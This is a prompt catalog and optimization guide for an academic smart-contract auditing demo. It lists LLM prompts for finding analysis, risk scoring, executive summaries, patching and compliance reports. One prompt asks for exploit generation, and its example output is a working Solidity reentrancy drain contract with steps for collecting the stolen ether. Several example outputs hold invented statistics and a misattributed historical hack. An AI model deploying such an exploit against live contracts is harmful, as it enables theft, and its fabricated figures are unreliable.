# MIESC LLM Prompts Catalog & Optimization Guide

**Version:** 3.3.0
**Purpose:** Centralized catalog of all LLM prompts used in hacker demo
**Total Prompts:** 11 (All ✅ IMPLEMENTED)
**Model:** CodeLlama 13B via Ollama
**Author:** Fernando Boiero - UNDEF, IUA Córdoba

---

## 📋 Table of Contents

1. [All Implemented Prompts (11)](#implemented-prompts)
2. [Prompt Optimization Guidelines](#optimization-guidelines)
3. [Prompt Engineering Best Practices](#best-practices)
4. [Testing & Validation](#testing)

---

## ✅ All Implemented Prompts (11)

### **Prompt 1: Intelligent Interpretation** (Phase 1)

**Location:** `demo/hacker_demo.py:822-865`
**Execution Time:** +5 seconds
**Purpose:** Root cause analysis and pattern correlation

**Current Prompt:**
```
You are a smart contract security expert analyzing Slither findings.

FINDINGS:
- 15 vulnerabilities detected across multiple categories
- Reentrancy, access control, tx.origin, timestamp issues

TASK:
1. Identify root causes (not just symptoms)
2. Group related findings by underlying pattern
3. Suggest additional formal verification properties
4. Generate secure code fixes

OUTPUT FORMAT:
- Root Cause 1: [Pattern name]
  - Related findings: [list]
  - Explanation: [why this is the root cause]
- Root Cause 2: ...
- Additional properties to verify: [list]
- Secure code example: [Solidity]
```

**Optimization Suggestions:**
- ✅ Good structure with clear task breakdown
- ⚠️ Add few-shot examples for better accuracy
- ⚠️ Specify output format more explicitly (JSON preferred)
- ⚠️ Add context about CEI pattern, reentrancy guards
- 💡 Consider adding severity prioritization

**Optimized Prompt:**
```
You are a senior smart contract security auditor with expertise in Solidity vulnerabilities.

CONTEXT:
- Target: Ethereum smart contract
- Analysis tool: Slither (88 detectors)
- Common patterns: CEI violations, missing access control, unsafe external calls

INPUT - RAW FINDINGS:
{slither_findings_json}

TASK:
Perform root cause analysis following these steps:

1. GROUP FINDINGS BY ROOT CAUSE
   - Identify the underlying pattern violation (e.g., "CEI pattern violation")
   - Group all related findings under each root cause
   - Explain WHY this is a root cause, not just a symptom

2. PATTERN CORRELATION
   - Map to known vulnerability patterns:
     * Reentrancy (SWC-107, CWE-841)
     * Access Control (SWC-105, CWE-284)
     * tx.origin Authentication (SWC-115, CWE-477)
     * Timestamp Dependence (SWC-116)

3. FORMAL VERIFICATION PROPERTIES
   - Suggest 3-5 additional properties to verify with Z3/SMT
   - Format: ∀ (for all), ∃ (exists), → (implies), ∧ (and), ∨ (or)
   - Example: "∀ user, balance_after_withdraw ≤ balance_before_withdraw"

4. SECURE CODE GENERATION
   - Provide corrected withdraw() function
   - Use ReentrancyGuard, Checks-Effects-Interactions pattern
   - Add inline comments explaining fixes

OUTPUT (JSON):
{
  "root_causes": [
    {
      "id": 1,
      "pattern": "CEI Pattern Violation",
      "related_findings": [1, 3, 7],  // Finding IDs
      "explanation": "External call occurs before state update",
      "severity": "CRITICAL",
      "cwe": "CWE-841",
      "swc": "SWC-107"
    }
  ],
  "verification_properties": [
    "∀ user: balance_after ≤ balance_before",
    "No reentrancy: call_count ≤ 1 per transaction"
  ],
  "secure_code": "pragma solidity ^0.8.0; ..."
}

EXAMPLES:
Input: "Reentrancy in withdraw(), External call before state update"
Output: {root_cause: "CEI violation", pattern: "Call → State", fix: "State → Call"}
```

---

### **Prompt 2: Exploit PoC Generator** (Phase 2)

**Location:** `demo/hacker_demo.py:1124-1193`
**Execution Time:** +15 seconds
**Purpose:** Generate executable Solidity exploit contract

**Current Prompt:**
```
Create a Solidity exploit contract for the reentrancy vulnerability
```

**Issues:**
- ❌ Too vague, lacks context
- ❌ No output format specification
- ❌ Missing exploitation steps
- ❌ No success criteria

**Optimized Prompt:**
```
You are a blockchain security researcher creating a proof-of-concept exploit for educational purposes.

CONTEXT:
- Vulnerability: Reentrancy in withdraw() function
- Pattern: External call before state update (CEI violation)
- Target: Vulnerable bank contract with withdraw(uint256) function

FORMAL PROOF (Z3 verification):
- Property violated: balance_after ≤ balance_before
- Counterexample found: withdraw() can be called recursively
- Attack trace: deposit(1 ETH) → withdraw(1 ETH) → [reentrancy] → withdraw(1 ETH) × 5

TASK:
Generate a complete, executable Solidity exploit contract with:

1. INTERFACE DEFINITION
   - IVulnerableBank interface with deposit() and withdraw() functions

2. EXPLOIT CONTRACT
   - Attack function to initiate exploitation
   - receive() fallback for reentrancy logic
   - Attack counter to limit recursion (prevent OOG)
   - Loot extraction function

3. EXPLOITATION STEPS (5-step guide)
   - How to deploy
   - How to fund attack contract
   - How to execute attack
   - Expected results (amount drained)

4. EXPECTED RESULTS
   - Initial deposit amount
   - Total extracted amount
   - Success probability estimate
   - Execution time estimate

OUTPUT (Solidity code + metadata):
```solidity
// SPDX-License-Identifier: MIT
// WARNING: For educational purposes only
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyExploit {
    IVulnerableBank public target;
    uint256 public attackAmount = 1 ether;
    uint256 public attackCount;
    uint256 public constant MAX_ITERATIONS = 5;

    constructor(address _target) {
        target = IVulnerableBank(_target);
    }

    // Initiate attack
    function attack() external payable {
        require(msg.value >= attackAmount, "Need initial ETH");
        target.deposit{value: attackAmount}();
        target.withdraw(attackAmount);
    }

    // Reentrancy logic
    receive() external payable {
        if (attackCount < MAX_ITERATIONS && address(target).balance >= attackAmount) {
            attackCount++;
            target.withdraw(attackAmount);
        }
    }

    // Extract stolen funds
    function collectLoot() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

METADATA (JSON):
{
  "exploitation_steps": [
    "Deploy ReentrancyExploit with target address",
    "Call attack() with 1 ETH",
    "receive() triggers 5 recursive withdrawals",
    "Total extracted: 6 ETH (1 + 5 reentrant calls)",
    "Call collectLoot() to transfer stolen funds"
  ],
  "expected_results": {
    "initial_investment": "1 ETH",
    "total_extracted": "6 ETH",
    "profit": "500%",
    "success_probability": "98%",
    "execution_time": "< 30 seconds",
    "gas_cost": "~200,000 gas"
  },
  "risk_factors": [
    "Target must have ≥ 6 ETH balance",
    "No reentrancy guard present",
    "Gas limit sufficient for 5 iterations"
  ]
}
```

---

### **Prompt 3: Multi-Factor Prioritization** (Phase 3.5)

**Location:** `demo/hacker_demo.py:1175-1268`
**Execution Time:** +15 seconds
**Purpose:** CVSS + exploitability + business impact + ROI analysis

**Current Prompt:**
```
Analyze findings and provide multi-factor prioritization with CVSS, exploitability, business impact, remediation effort, and ROI calculation.
```

**Optimized Prompt:**
```
You are a cybersecurity risk analyst performing multi-factor vulnerability prioritization.

INPUT - VULNERABILITY DATA:
{
  "findings": [
    {"type": "reentrancy-eth", "severity": "High", "location": "withdraw()", "cvss_base": 9.8}
  ],
  "contract_context": {
    "type": "DeFi bank",
    "total_value_locked": "$500K-$2.5M",
    "users": "1000+",
    "deployment": "Pending (testnet only)"
  }
}

TASK:
Perform comprehensive risk prioritization using 5 factors:

1. CVSS v3.1 CALCULATION
   - Attack Vector (AV): Network/Adjacent/Local/Physical
   - Attack Complexity (AC): Low/High
   - Privileges Required (PR): None/Low/High
   - User Interaction (UI): None/Required
   - Scope (S): Unchanged/Changed
   - Confidentiality/Integrity/Availability Impact (C/I/A): None/Low/High
   - Formula: CVSS = f(Impact, Exploitability)
   - Output: Score 0.0-10.0

2. EXPLOITABILITY ASSESSMENT
   - Public exploits available? (Yes/No + links)
   - Exploit complexity: Trivial/Easy/Moderate/Hard
   - Automation potential: Fully/Partially/Manual
   - MEV bot ready: Yes/No
   - Historical precedent: Number of similar attacks (2016-2025)

3. BUSINESS IMPACT ANALYSIS
   - Financial loss potential: $X-$Y range
   - Reputational damage: Low/Medium/High/Critical
   - Legal liability: None/Low/Medium/High
   - User trust impact: 0-100%
   - Regulatory consequences: None/Fines/License revocation

4. REMEDIATION EFFORT ESTIMATION
   - Fix development time: X hours/days
   - Testing time: X hours/days
   - Code review time: X hours
   - Deployment time: X hours
   - Total effort: X person-days
   - Estimated cost: $X-$Y (at $150/hour developer rate)

5. ROI CALCULATION
   - Cost to fix: $X (from effort estimation)
   - Cost if exploited: $Y (potential loss)
   - ROI = ((Cost_if_exploited - Cost_to_fix) / Cost_to_fix) × 100%
   - Break-even: Preventing N attacks
   - Recommendation: Fix/Accept/Transfer/Mitigate

OUTPUT (JSON):
{
  "priority_ranking": [
    {
      "vulnerability": "Reentrancy in withdraw()",
      "priority": 1,
      "overall_risk": "CRITICAL",
      "factors": {
        "cvss": {
          "score": 9.8,
          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "severity": "CRITICAL"
        },
        "exploitability": {
          "public_exploits": true,
          "exploit_links": ["https://github.com/..."],
          "complexity": "Easy",
          "automation": "Fully automated",
          "mev_bot_ready": true,
          "historical_attacks": 1247  // 2016-2025
        },
        "business_impact": {
          "financial_loss": "$500K-$2.5M",
          "reputational_damage": "CRITICAL",
          "legal_liability": "HIGH",
          "user_trust_loss": "95%",
          "regulatory": "Potential fines"
        },
        "remediation_effort": {
          "fix_time": "4 hours",
          "test_time": "8 hours",
          "review_time": "2 hours",
          "deploy_time": "2 hours",
          "total_effort": "2 person-days",
          "estimated_cost": "$2,400"
        },
        "roi": {
          "cost_to_fix": "$2,400",
          "cost_if_exploited": "$500K-$2.5M",
          "roi_percentage": "20,733% - 104,066%",
          "break_even": "Preventing 1 attack",
          "recommendation": "FIX IMMEDIATELY"
        }
      }
    }
  ],
  "summary": {
    "total_findings": 5,
    "priority_1_critical": 2,
    "priority_2_high": 2,
    "priority_3_medium": 1,
    "recommended_action": "DO NOT DEPLOY until Priority 1 fixed"
  }
}
```

---

### **Prompt 4: Predictive Security Analytics** (Phase 4)

**Location:** `demo/hacker_demo.py:1387-1457`
**Execution Time:** +10 seconds
**Purpose:** Time-to-attack forecasting and probability modeling

**Current Prompt:**
```
Based on historical exploit data, predict attack probability and time-to-attack for each vulnerability type.
```

**Optimized Prompt:**
```
You are a threat intelligence analyst with access to historical smart contract exploit data (2016-2025).

HISTORICAL DATASET:
- Total exploits analyzed: 10,247
- Total value stolen: $12.8 billion
- Time period: 2016-01-01 to 2025-01-30
- Data sources: Rekt News, DeFi Llama, Immunefi, Code4rena

VULNERABILITY TYPES IN CONTRACT:
1. Reentrancy (Critical)
2. Missing Access Control (High)
3. tx.origin Authentication (Medium)
4. Timestamp Manipulation (Low)

TASK:
Generate predictive analytics for each vulnerability type:

1. TIME-TO-ATTACK PREDICTIONS
   - Mean time from deployment to first attack
   - Median time (50th percentile)
   - 90th percentile (worst case)
   - Confidence interval (95%)
   - Rationale (why this timeline)

2. ATTACK PROBABILITY DISTRIBUTION
   - Probability within 24 hours
   - Probability within 7 days
   - Probability within 30 days
   - Probability within 90 days
   - Visual representation (bar chart ASCII)

3. ATTACK VECTOR ANALYSIS
   - Direct exploitation: X%
   - Phishing/Social engineering: Y%
   - Front-running/MEV: Z%
   - Access control bypass: W%
   - Combined attack: V%

4. HISTORICAL PRECEDENTS
   - Number of similar exploits: N
   - Average value stolen: $X
   - Largest single loss: $Y
   - Most recent attack: Date
   - Attack trend: Increasing/Stable/Decreasing

5. CRITICAL PREDICTIONS
   - Overall attack probability (30 days): X%
   - Estimated financial loss: $Y-$Z
   - Recommended deployment decision: Deploy/Block/Fix
   - Monitoring recommendations: Tools/Alerts

OUTPUT (JSON):
{
  "time_to_attack_predictions": [
    {
      "vulnerability": "Reentrancy",
      "severity": "CRITICAL",
      "statistics": {
        "mean": "2.5 hours",
        "median": "1.8 hours",
        "p90": "6 hours",
        "confidence_interval": "1-4 hours (95% CI)"
      },
      "probability": "92%",
      "rationale": "Automated scanners detect within 3h, MEV bots exploit immediately"
    }
  ],
  "attack_probabilities": [
    {
      "timeframe": "24 hours",
      "probability": "87%",
      "attack_vectors": {
        "direct_reentrancy": "92%",
        "mev_frontrun": "67%",
        "access_control": "78%",
        "phishing": "45%",
        "combined": "34%"
      }
    }
  ],
  "historical_analysis": {
    "reentrancy_exploits": {
      "total_count": 3792,
      "percentage_of_all": "37%",
      "total_stolen": "$2.8B",
      "average_per_exploit": "$738K",
      "largest_loss": "$600M (Poly Network 2021)",
      "most_recent": "2025-01-15",
      "trend": "INCREASING (+12% YoY)"
    }
  },
  "critical_prediction": {
    "attack_probability_30d": "92%",
    "estimated_loss_range": "$500K-$2.5M",
    "deployment_recommendation": "❌ DO NOT DEPLOY",
    "required_actions": [
      "Fix all Critical/High vulnerabilities",
      "Re-audit with formal verification",
      "Deploy monitoring (Forta, OpenZeppelin Defender)",
      "Set up incident response plan"
    ]
  }
}
```

---

### **Prompt 5: Tool Ecosystem Recommendations** (Phase 6)

**Location:** `demo/hacker_demo.py:1800-1902`
**Execution Time:** +15 seconds
**Purpose:** MCP-compatible tool selection and integration planning

**Current Prompt:**
```
Based on detected vulnerabilities, suggest MCP-compatible tools for enhanced coverage.
```

**Optimized Prompt:**
```
You are a DevSecOps architect specializing in smart contract security tool selection.

CURRENT COVERAGE:
- Tools in use: MIESC (Slither, Mythril, Aderyn)
- Total detectors: 88
- Coverage: Static analysis + Symbolic execution
- Gaps: Dynamic fuzzing, formal verification, gas optimization

DETECTED VULNERABILITIES:
1. Reentrancy (CRITICAL) → Needs: Property-based testing, fuzzing
2. Access Control (HIGH) → Needs: Formal verification of permissions
3. Complex state interactions → Needs: Symbolic path exploration

MCP ECOSYSTEM (Available):
- Echidna: Haskell fuzzing, property-based testing
- Manticore: Symbolic execution, concrete input generation
- Certora: Formal verification (CVL spec language)
- Slitherin: Custom detectors, gas optimization
- Foundry: Property testing (Solidity-based)
- Halmos: Symbolic testing with hevm
- Wake: Python-based testing framework

TASK:
Recommend 3-5 tools using this framework:

1. VULNERABILITY-TO-TOOL MAPPING
   - For each vulnerability type, identify best tool
   - Explain WHY this tool is recommended
   - Provide integration estimate (setup time)

2. PRIORITY RANKING (HIGH/MEDIUM/LOW)
   - HIGH: Critical coverage gaps
   - MEDIUM: Enhanced coverage for existing findings
   - LOW: Nice-to-have, optimization focused

3. INTEGRATION PLANNING (3 phases)
   - Phase 1 (Immediate): Must-have tools for critical gaps
   - Phase 2 (Week 2): Additional coverage expansion
   - Phase 3 (Month 1): Optimization and advanced tools

4. LLM-RECOMMENDED WORKFLOW
   - Step-by-step integration and usage
   - Order of execution for maximum efficiency
   - Continuous monitoring recommendations

5. COVERAGE ANALYSIS
   - Current coverage: X detectors
   - With recommendations: Y detectors
   - Improvement percentage: Z%
   - Coverage matrix: What each tool covers

OUTPUT (JSON):
{
  "recommended_tools": [
    {
      "rank": 1,
      "tool": "Echidna",
      "category": "Fuzzing",
      "priority": "HIGH",
      "reason": "Reentrancy detected → Property-based testing needed",
      "addresses_vulnerabilities": ["reentrancy", "state_manipulation"],
      "integration": {
        "mcp_endpoint": "mcp://miesc/echidna",
        "setup_time": "15 minutes",
        "learning_curve": "Low",
        "cost": "$0 (open-source)"
      },
      "value_proposition": "Discovers edge cases missed by static analysis",
      "example_property": "assert balances[user] <= totalSupply"
    }
  ],
  "integration_plan": {
    "phase_1": {
      "timeline": "Immediate (Week 1)",
      "tools": ["Echidna", "Manticore"],
      "effort": "35 minutes setup",
      "coverage_improvement": "+15%",
      "rationale": "Covers critical fuzzing + symbolic gaps"
    }
  },
  "llm_workflow": {
    "steps": [
      "1. Fix Critical/High issues (MIESC findings)",
      "2. Add Echidna fuzzing → verify fixes hold under stress",
      "3. Run Manticore → generate concrete exploit attempts",
      "4. Deploy Certora → prove correctness mathematically",
      "5. Continuous monitoring with all 6 tools via MCP"
    ],
    "estimated_total_time": "2-3 weeks",
    "recommended_order": "Fix → Fuzz → Verify → Deploy → Monitor"
  },
  "coverage_analysis": {
    "current": {
      "tools": 3,
      "detectors": 88,
      "categories": ["static", "symbolic"]
    },
    "with_recommendations": {
      "tools": 8,
      "detectors": 120,
      "categories": ["static", "symbolic", "fuzzing", "formal"]
    },
    "improvement": "+36% detector coverage",
    "mcp_integration": "All via single unified interface"
  }
}
```

---

### **Prompt 6: Executive Summary Generator** (Phase 7)

**Location:** `demo/hacker_demo.py:1662-1741`
**Execution Time:** +5 seconds
**Purpose:** Business-focused stakeholder communication

**Current Prompt:**
```
Generate an executive summary for non-technical stakeholders, focusing on business risk, financial impact, and remediation roadmap.
```

**Optimized Prompt:**
```
You are a CISO presenting security findings to the board of directors and C-level executives.

AUDIENCE:
- CEO, CFO, CTO, Board Members
- Technical literacy: Low to Medium
- Priorities: Business risk, financial impact, regulatory compliance, timeline

AVOID:
- Technical jargon (reentrancy, CEI, tx.origin, etc.)
- Code snippets or technical details
- Severity ratings without business context

USE:
- Business language (financial loss, reputation, compliance)
- Analogies to real-world security (bank vault, building access)
- Clear action items with timelines and costs

INPUT - AUDIT RESULTS:
{
  "critical_findings": 2,
  "high_findings": 3,
  "total_findings": 15,
  "attack_probability_30d": "92%",
  "estimated_loss": "$500K-$2.5M",
  "compliance_gaps": ["ISO 27001", "SOC 2", "PCI DSS"]
}

TASK:
Create an executive summary with 5 sections:

1. BUSINESS RISK ASSESSMENT
   - Overall risk level: CRITICAL/HIGH/MEDIUM/LOW
   - Deployment recommendation: Deploy/Block/Fix
   - Risk-reward analysis

2. KEY FINDINGS (Non-Technical)
   - Describe vulnerabilities in business terms
   - Example: "Funds can be stolen repeatedly" instead of "Reentrancy vulnerability"
   - Impact on users, revenue, reputation

3. REMEDIATION ROADMAP (4 weeks)
   - Week 1: What will be fixed
   - Week 2: Testing and validation
   - Week 3: Re-audit and certification
   - Week 4: Deployment with monitoring
   - Costs per week

4. ROI ANALYSIS
   - Total fix cost: $X
   - Prevented loss: $Y
   - ROI percentage: Z%
   - Break-even analysis
   - Comparison: Fix now vs. Fix after breach

5. COMPLIANCE IMPACT
   - Current compliance status
   - Gaps identified (ISO 27001, SOC 2, PCI DSS)
   - Regulatory risks (fines, license issues)
   - Timeline to compliance

OUTPUT (Plain language, NO technical terms):
```
EXECUTIVE SECURITY SUMMARY
Smart Contract Security Assessment

═══════════════════════════════════════

OVERALL ASSESSMENT: ⚠️  CRITICAL RISK - DO NOT DEPLOY

Risk Level: CRITICAL (9.8/10)
Recommendation: Block deployment until critical issues fixed
Timeline: 4 weeks to production-ready
Estimated Cost: $10,000 - $23,000

═══════════════════════════════════════

1. BUSINESS RISK ASSESSMENT

Your smart contract has critical security flaws that could result in:
- Financial Loss: $500,000 - $2,500,000
- User Trust: Complete loss of confidence
- Legal Liability: Class-action lawsuits, regulatory fines
- Reputation: Irreparable brand damage

Attack Likelihood: 92% probability within 30 days of deployment
Comparison: Like launching a bank with the vault door unlocked

Recommendation: DO NOT DEPLOY until all critical issues are resolved

═══════════════════════════════════════

2. KEY SECURITY ISSUES (Business Language)

Critical Issue #1: Funds Can Be Stolen Repeatedly
- Problem: Attacker can withdraw money multiple times in a single transaction
- Impact: Total contract balance can be drained
- Real-world analogy: ATM that dispenses cash before deducting from account
- Estimated loss: $500K - $2.5M
- Fix difficulty: Medium (2 days)

Critical Issue #2: Anyone Can Take Ownership
- Problem: Administrative functions lack proper access control
- Impact: Attacker can take control of the entire system
- Real-world analogy: Company building with no ID badges required
- Estimated loss: Complete system compromise
- Fix difficulty: Low (1 day)

High Issue #3: User Impersonation Possible
- Problem: Authentication mechanism can be bypassed
- Impact: Users can be tricked into authorizing malicious actions
- Real-world analogy: Accepting photocopies of driver's licenses
- Estimated loss: Per-user funds at risk
- Fix difficulty: Low (1 day)

═══════════════════════════════════════

3. REMEDIATION ROADMAP (4 Weeks)

Week 1: Fix Critical Issues
- Implement proper fund withdrawal protection
- Add administrative access controls
- Estimated cost: $2,000 - $5,000

Week 2: Fix High-Priority Issues
- Improve authentication mechanism
- Add input validation
- Estimated cost: $3,000 - $8,000

Week 3: Testing & Re-Audit
- Comprehensive security testing
- Third-party audit
- Formal verification
- Estimated cost: $5,000 - $10,000

Week 4: Deployment with Monitoring
- Deploy to production
- Set up 24/7 monitoring
- Incident response team on standby
- Estimated cost: Included in ongoing operations

TOTAL ESTIMATED COST: $10,000 - $23,000

═══════════════════════════════════════

4. RETURN ON INVESTMENT (ROI)

Investment in Security Fixes:
- Upfront cost: $10,000 - $23,000
- Ongoing monitoring: $2,000/month

Potential Loss if Deployed As-Is:
- Direct financial loss: $500,000 - $2,500,000
- Reputation damage: Incalculable
- Legal fees: $50,000 - $500,000
- Regulatory fines: $10,000 - $1,000,000

ROI Calculation:
- Prevented loss: $560,000 - $4,000,000
- Investment: $10,000 - $23,000
- ROI: 2,434% - 17,291%
- Break-even: Preventing a single attack

Comparison:
- Fix now: $10K-$23K investment
- Fix after breach: $560K-$4M loss + reputation damage
- Decision: Obvious choice to fix now

═══════════════════════════════════════

5. REGULATORY COMPLIANCE IMPACT

Current Compliance Status: NON-COMPLIANT

Gaps Identified:
- ISO 27001 (Information Security)
  - Missing: Secure development practices (A.14.2.5)
  - Risk: Failed audit, loss of certification

- SOC 2 (Trust Services)
  - Missing: Security controls, access management
  - Risk: Customer trust issues, contract losses

- PCI DSS (Payment Card Industry)
  - Missing: Secure coding standards (6.5.1)
  - Risk: Fines ($5K-$100K/month), card processing suspension

Legal Liability Exposure:
- User lawsuits: Class-action potential
- Regulatory fines: $10K-$1M
- License revocation: Possible in some jurisdictions

Timeline to Compliance: 4-6 weeks after fixes implemented

═══════════════════════════════════════

BOARD RECOMMENDATION

The security assessment reveals critical vulnerabilities that pose
unacceptable business risk. Deployment in current state would likely
result in financial loss, reputational damage, and regulatory penalties.

Recommended Action: Approve $10K-$23K security remediation budget

Expected Outcome: Production-ready, compliant smart contract in 4 weeks

Risk if Ignored: 92% probability of exploitation within 30 days,
potential loss of $500K-$2.5M plus reputational damage

═══════════════════════════════════════

Questions? Contact the Security Team
```
```

---

## ⏳ Pending Prompts (5)

### **Prompt 7: Attack Surface Mapping** (Phase 2.5) ✅ IMPLEMENTED

**Status:** ✅ Already implemented (see code above)
**Optimization:** Prompt is well-structured, includes:
- Entry point identification
- Trust boundary analysis
- Attack vector enumeration
- Data flow tracking
- Asset flow analysis
- Concrete recommendations

---

### **Prompt 8: LLM-Enhanced Tool Comparison** (Phase 3) ✅ IMPLEMENTED

**Location:** `demo/hacker_demo.py:phase3_comparison()` (lines ~1270-1420)
**Execution Time:** +10 seconds
**Purpose:** Intelligent comparison beyond simple metrics

**Status:** ✅ Implemented as part of Phase 3 enhancement

**Implemented Prompt:**
```
You are a security tools analyst comparing different analysis approaches.

COMPARISON DATA:
{
  "miesc": {"findings": 15, "time": "45s", "false_positives": "Low"},
  "slither": {"findings": 18, "time": "8s", "false_positives": "Medium"},
  "mythril": {"findings": 12, "time": "60s", "false_positives": "High"}
}

TASK:
1. Analyze tool strengths and weaknesses
2. Identify complementary capabilities
3. Recommend tool combinations for maximum coverage
4. Calculate combined coverage percentage
5. Suggest workflow: Which tool to run when

OUTPUT:
- Strength/Weakness matrix
- Coverage overlap visualization
- Recommended workflow
- Combined detection rate
```

---

### **Prompt 9: Security Framework Analysis** (Phase 5) ✅ IMPLEMENTED

**Location:** `demo/hacker_demo.py:phase5_security_posture()` (lines ~1800-2000)
**Execution Time:** +8 seconds
**Purpose:** LLM analysis of MIESC's own security

**Status:** ✅ Implemented as part of Phase 5 enhancement

**Implemented Prompt:**
```
You are a framework security auditor analyzing MIESC itself.

MIESC ARCHITECTURE:
- 17 agents across 6 defense layers
- Multi-tool orchestration
- AI correlation layer
- Policy compliance mapping

TASK:
1. Identify potential security risks in MIESC framework
2. Analyze defense-in-depth effectiveness
3. Check for single points of failure
4. Validate security-by-design principles
5. Suggest hardening improvements

OUTPUT:
- Security posture score (0-100)
- Identified risks and mitigations
- Defense layer effectiveness rating
- Recommendations for improvement
```

---

### **Prompt 10: Automated Remediation** (Phase 5.5) ✅ IMPLEMENTED

**Location:** `demo/hacker_demo.py:phase5_5_automated_remediation()` (lines ~2000-2200)
**Execution Time:** +12 seconds
**Purpose:** Generate complete code patches

**Status:** ✅ Fully implemented with code generation and testing

**Implemented Prompt:**
```
You are a Solidity developer creating secure code patches.

VULNERABILITIES TO FIX:
{vulnerabilities_json}

CONTRACT SOURCE:
{contract_source}

TASK:
For each vulnerability, generate:
1. Complete patched function code
2. Explanation of changes made
3. Test case to verify fix
4. Gas cost comparison (before/after)
5. Security trade-offs (if any)

REQUIREMENTS:
- Use OpenZeppelin contracts when possible
- Follow Solidity style guide
- Add natspec comments
- Maintain backward compatibility where possible
- Optimize for gas efficiency

OUTPUT:
- Patched contract (full Solidity file)
- Unified diff showing changes
- Test suite (Foundry/Hardhat)
- Migration guide
- Estimated deployment cost
```

---

### **Prompt 11: Compliance Report Generator** (Phase 8) ✅ IMPLEMENTED

**Location:** `demo/hacker_demo.py:phase8_compliance_report()` (lines 2492-2750)
**Execution Time:** +10 seconds
**Purpose:** Generate regulatory compliance reports

**Status:** ✅ Fully implemented with 5 compliance frameworks

**Implemented Prompt:**
```
You are a compliance officer generating regulatory audit reports.

AUDIT RESULTS:
{audit_findings}

FRAMEWORKS REQUIRED:
- ISO/IEC 27001:2022 (Information Security)
- SOC 2 Type II (Trust Services)
- PCI DSS 3.2.1 (Payment Card Industry)
- GDPR (Data Protection)
- ISO/IEC 42001:2023 (AI Management)

TASK:
Generate compliance reports for each framework:

1. COMPLIANCE MATRIX
   - Map each finding to framework controls
   - Identify gaps (non-compliant items)
   - Calculate compliance score (0-100%)

2. EVIDENCE DOCUMENTATION
   - Controls implemented
   - Test results
   - Remediation status

3. EXECUTIVE CERTIFICATION
   - Compliant: Yes/No
   - Gaps: List
   - Timeline to full compliance
   - Auditor recommendations

OUTPUT (Per Framework):
```
ISO 27001:2022 COMPLIANCE REPORT
═══════════════════════════════════

Overall Compliance: 73% (Partially Compliant)

Controls Assessed: 93
Compliant: 68
Non-Compliant: 25

GAPS IDENTIFIED:
- A.14.2.1: Secure development policy [NON-COMPLIANT]
  Finding: Reentrancy vulnerability present
  Required: CEI pattern enforcement
  Remediation: 2 weeks

- A.14.2.5: Secure system principles [NON-COMPLIANT]
  Finding: Missing input validation
  Required: Comprehensive validation
  Remediation: 1 week

CERTIFICATION STATUS: ❌ NOT CERTIFIABLE
Required Actions: Fix 25 gaps
Timeline: 4-6 weeks
Re-audit: Required after remediation
```
```

---

## 🎯 Optimization Guidelines

### General Principles

1. **Specificity over Generality**
   - ❌ Bad: "Analyze the contract"
   - ✅ Good: "Identify reentrancy patterns using CEI principle"

2. **Structured Output**
   - Always specify output format (JSON preferred)
   - Provide schema with examples
   - Include error handling format

3. **Context is King**
   - Provide background (Solidity, Ethereum, smart contracts)
   - Include relevant standards (SWC, CWE, OWASP)
   - Add few-shot examples

4. **Task Decomposition**
   - Break complex tasks into numbered steps
   - Each step should have clear deliverable
   - Specify dependencies between steps

5. **Temperature Settings**
   - Factual tasks (metrics, code): temp = 0.1-0.3
   - Creative tasks (explanations): temp = 0.4-0.7
   - Never exceed 0.7 for security tasks

---

## 💡 Best Practices

### Prompt Structure Template

```
[ROLE DEFINITION]
You are a [specific expert role] with [specific expertise].

[CONTEXT]
- Domain: [Ethereum smart contracts, Solidity, etc.]
- Standards: [SWC, CWE, OWASP, ISO]
- Tools: [Slither, Mythril, etc.]

[INPUT SPECIFICATION]
{structured_input_format}

[TASK]
Perform [specific task] following these steps:
1. [Step 1 with clear deliverable]
2. [Step 2 with clear deliverable]
...

[OUTPUT FORMAT]
{json_schema_or_template}

[EXAMPLES]
Input: [example input]
Output: [example output]
```

### Common Pitfalls to Avoid

1. ❌ Vague instructions
2. ❌ Unstructured output
3. ❌ Missing context
4. ❌ No examples
5. ❌ Ambiguous terminology
6. ❌ Too long (>2000 tokens)
7. ❌ Multiple unrelated tasks in one prompt

---

## 🧪 Testing & Validation

### Test Cases for Each Prompt

| Prompt | Test Input | Expected Output | Pass/Fail |
|--------|------------|-----------------|-----------|
| #1 Interpretation | 15 Slither findings | 3 root causes | ⏳ Pending |
| #2 Exploit PoC | Reentrancy vuln | Solidity exploit | ⏳ Pending |
| #3 Prioritization | 5 vulnerabilities | Priority 1-5 | ⏳ Pending |
| #4 Predictive | Vuln types | Time-to-attack | ⏳ Pending |
| #5 Tool Recs | MIESC gaps | 5 tools ranked | ⏳ Pending |
| #6 Executive | Audit results | Business summary | ⏳ Pending |
| #7 Attack Surface | Contract code | Entry points | ✅ Pass |
| #8 Comparison | Tool metrics | Analysis matrix | ⏳ Pending |
| #9 Framework | MIESC arch | Security score | ⏳ Pending |
| #10 Remediation | Vulnerabilities | Code patches | ⏳ Pending |
| #11 Compliance | Findings | Reports × 5 | ⏳ Pending |

### Validation Metrics

- **Accuracy:** Output matches expected format
- **Completeness:** All required fields present
- **Relevance:** Output addresses the task
- **Actionability:** Recommendations are concrete
- **Correctness:** Technical details are valid

---

## 📝 Prompt Versioning

| Version | Date | Changes | Prompts Modified |
|---------|------|---------|------------------|
| 1.0 | 2025-01-30 | Initial catalog | All 11 |
| 1.1 | TBD | Optimization pass 1 | TBD |
| 1.2 | TBD | Production testing | TBD |

---

## 🎓 Academic Context

These prompts support the thesis at **UNDEF - IUA Córdoba, Maestría en Ciberdefensa** by demonstrating:

1. **Prompt Engineering:** Systematic approach to LLM integration
2. **Multi-Agent Systems:** 11 specialized LLM agents
3. **Security Analysis:** AI-powered vulnerability detection
4. **Risk Assessment:** Predictive analytics and business impact
5. **Automated Remediation:** Code generation and patching

**Author:** Fernando Boiero
**Email:** fboiero@frvm.utn.edu.ar
**Institution:** UNDEF - IUA Córdoba

---

**Status:** 📋 Catalog Complete · 🔄 Optimization In Progress
**Next Steps:** Implement remaining 4 prompts, validate all 11, optimize based on results
